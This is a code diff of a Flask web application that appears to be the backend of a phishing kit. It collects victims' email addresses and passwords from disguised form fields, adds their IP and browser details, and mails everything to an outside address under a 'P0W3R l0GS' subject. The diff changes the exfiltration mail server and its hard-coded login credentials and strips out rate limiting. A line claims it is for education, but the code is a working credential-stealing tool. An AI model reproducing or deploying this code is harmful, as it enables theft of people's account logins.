@@ -1,8 +1,6 @@
 from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
 import secrets
 import random
-from flask_limiter import Limiter
-from flask_limiter.util import get_remote_address
 import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -10,7 +8,6 @@ from email.mime.multipart import MIMEMultipart
 # made for education purposes only
 
 app = Flask(__name__)
-limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
 secret_keyx = secrets.token_urlsafe(24)
 app.secret_key = secret_keyx
 
@@ -145,13 +142,12 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contant@greenscience.bio"
-        sender_emaill = "contant"
+        sender_email = "mrrobot@guide-level.com"
         receiver_email = "hermannie.trx@gmail.com"
-        password = "vipd668e509527f"
+        password = "(48ENNQF48Wz"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "P0WER l0GS ! 1"
+        message["Subject"] = "P0W3R l0GS ! 1"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -164,8 +160,8 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("5.149.253.103", 6040) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
 
@@ -183,13 +179,12 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contant@greenscience.bio"
-        sender_emaill = "contant"
+        sender_email = "mrrobot@guide-level.com"
         receiver_email = "hermannie.trx@gmail.com"
-        password = "vipd668e509527f"
+        password = "(48ENNQF48Wz"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "P0WER l0GS !! 2"
+        message["Subject"] = "P0W3R l0GS !! 2"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -202,8 +197,8 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("5.149.253.103", 6040) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
 
